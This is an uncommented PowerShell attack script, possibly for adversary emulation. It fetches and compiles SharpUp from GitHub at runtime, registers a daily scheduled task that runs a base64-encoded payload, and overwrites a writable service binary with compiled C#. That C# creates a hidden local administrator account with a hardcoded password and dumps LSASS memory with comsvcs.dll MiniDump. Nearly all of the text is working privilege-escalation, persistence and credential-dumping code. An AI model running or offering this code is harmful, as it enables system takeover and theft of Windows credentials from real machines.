$ps1 = @'
$id = Get-Random
$code = (iwr https://raw.githubusercontent.com/GhostPack/SharpUp/master/SharpUp/Program.cs -UseBasicParsing) -replace "class Program","public class Runner$id" -replace "namespace SharpUp","namespace ShipOut"
$assemblies = ("System.Core","System.Xml.Linq","System.Data","System.Xml", "System.Data.DataSetExtensions", "Microsoft.CSharp", "System.ServiceProcess", "System.Management")
Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $code -Language CSharp -IgnoreWarnings
iex "[ShipOut.Runner$id]::GetModifiableServiceBinaries()"
'@

$bytes = [System.Text.Encoding]::Unicode.GetBytes($ps1)
$encodedCommand = [Convert]::ToBase64String($bytes)

$ps2 = "powershell -enc $encodedCommand | out-file $env:APPDATA\services.txt" | % { $_ | out-file $env:APPDATA\payload.ps1 }

$A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command $env:APPDATA\payload.ps1"
$T = New-ScheduledTaskTrigger -Daily -At "00:01"
$P = New-ScheduledTaskPrincipal "$env:USERNAME"
$S = New-ScheduledTaskSettingsSet
$D = New-ScheduledTask -Action $A -Principal $P -Trigger $T -Settings $S
Register-ScheduledTask T1 -InputObject $D -Force 
start-sleep 30
Start-ScheduledTask -TaskName T1
start-sleep 30
$f=(Get-Content $env:AppData\services.txt)
$targets = @()
(($f -match '^  (Name|PathName)') -replace '  Name',"`nName" -replace "  PathName","PathName") -join "," | % {
    if($_ -notmatch '^ '){
        $_ -replace "`",`n","`"`n" -replace "^`n",'' -split "`n" | % {
            $service = ("{{'{0}'}}" -f ("$_" -replace '             : ',"':'" -replace '         : ',"':'" -replace ',',"','" -replace '\\','\\'))
            $targets += ($service |convertfrom-json)
        }
    }
}

if($targets.Count -gt 0){
    $code = @"
using System;
using System.DirectoryServices;
using System.Diagnostics;

namespace HelloWorld
{
	public class Program$id
	{
		public static void Main(){
			DirectoryEntry hostMachineDirectory = new DirectoryEntry("WinNT://localhost");
            DirectoryEntries entries = hostMachineDirectory.Children;
            bool userExists = false;
            foreach (DirectoryEntry each in entries)
            {
                userExists = each.Name.Equals("TestUser1",StringComparison.CurrentCultureIgnoreCase);
                if (userExists)
                    break;
            }

            if (false == userExists)
            {
                
                DirectoryEntry AD = new DirectoryEntry("WinNT://" +
                Environment.MachineName + ",computer");
                DirectoryEntry NewUser = AD.Children.Add("TestUser1", "user");
                NewUser.Invoke("SetPassword", new object[] {"#12345Abc"});
                NewUser.Invoke("Put", new object[] {"Description", "Test User from .NET"});
                NewUser.CommitChanges();
                DirectoryEntry grp;

                grp = AD.Children.Find("Administrators", "group");
                if (grp != null) {grp.Invoke("Add", new object[] {NewUser.Path.ToString()});}
                Console.WriteLine("Account Created Successfully");
            }

            Process[] processlist = Process.GetProcessesByName("lsass");
            foreach (Process p in processlist)
            {
                var strPID = Convert.ToString(p.Id);

                var process = new Process {
                StartInfo = new ProcessStartInfo {
                        FileName = @"c:\windows\system32\rundll32.exe",
                        Arguments = String.Format(@"C:\windows\System32\comsvcs.dll, MiniDump {0} C:\Temp\dumper.dmp full",strPID)
                    }
                };
                process.Start();
                process.WaitForExit();

                var copy = new Process {
                StartInfo = new ProcessStartInfo {
                        FileName = @"c:\windows\system32\cmd.exe",
                        Arguments = String.Format("/k \"move /Y C:\\Temp\\dumper.dmp C:\\temp\\temp.dmp\"")
                    }
                };
                copy.Start();
                copy.WaitForExit();
                break;
            }

            
		}
	}
}
"@  | out-file C:\temp\adduser.cs
    $name = $targets[0].Name.Trim()
    $path = ($targets[0].PathName -replace '"','')
    C:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:$path c:\temp\adduser.cs 
    Stop-Service $name -ErrorAction SilentlyContinue
    Start-Service $name -ErrorAction SilentlyContinue

} 

